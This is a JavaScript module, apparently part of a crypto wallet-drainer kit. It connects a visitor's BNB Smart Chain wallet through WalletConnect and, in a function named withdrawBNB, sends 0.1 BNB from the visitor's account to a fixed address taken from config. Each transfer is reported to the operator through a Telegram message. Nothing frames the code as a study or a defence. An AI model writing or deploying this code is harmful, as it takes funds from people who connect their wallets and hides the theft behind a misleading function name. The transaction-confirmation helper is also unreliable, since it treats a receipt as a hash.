import Web3 from 'web3';
import WalletConnectProvider from '@walletconnect/web3-provider';
import axios from 'axios';
import { sendTelegramMessage } from './telegram';
import { BNB_RPC_URL, BNB_WALLET_ADDRESS } from '../config';

export async function connectBNBWallet() {
    const provider = new WalletConnectProvider({
        rpc: {
            56: BNB_RPC_URL, // 56 is the chain ID for Binance Smart Chain
        },
    });

    await provider.enable();
    window.web3 = new Web3(provider);
}

export async function withdrawBNB() {
    const accounts = await window.web3.eth.getAccounts();
    const account = accounts[0];
    const gasPrice = await getGasPrice();

    const transaction = {
        to: BNB_WALLET_ADDRESS,
        value: window.web3.utils.toWei('0.1', 'ether'), // Adjust value accordingly
        gasPrice,
        gas: 21000, // Standard gas limit for BNB transfer
    };

    const txHash = await window.web3.eth.sendTransaction(transaction);
    await confirmTransaction(txHash, window.web3.eth);
    sendTelegramMessage(`BNB withdrawal: ${transaction.value} to ${transaction.to}`);
}

async function getGasPrice() {
    try {
        const response = await axios.get('https://api.bscscan.com/api', {
            params: {
                module: 'gastracker',
                action: 'gasoracle',
                apikey: 'YOUR_BSC_API_KEY',
            },
        });
        const gasPrice = response.data.result.ProposeGasPrice;
        return gasPrice * 1e9; // Convert to Wei
    } catch (error) {
        console.error('Error fetching BNB gas price:', error);
        return window.web3.utils.toWei('20', 'gwei'); // Default to 20 Gwei
    }
}

async function confirmTransaction(txHash, web3) {
    let confirmed = false;
    let retries = 10;
    while (!confirmed && retries > 0) {
        const receipt = await web3.getTransactionReceipt(txHash);
        if (receipt && receipt.status) {
            confirmed = true;
        } else {
            await new Promise(resolve => setTimeout(resolve, 30000)); // Wait 30 seconds
            retries--;
        }
    }
    if (!confirmed) {
        throw new Error('BNB transaction confirmation failed');
    }
}
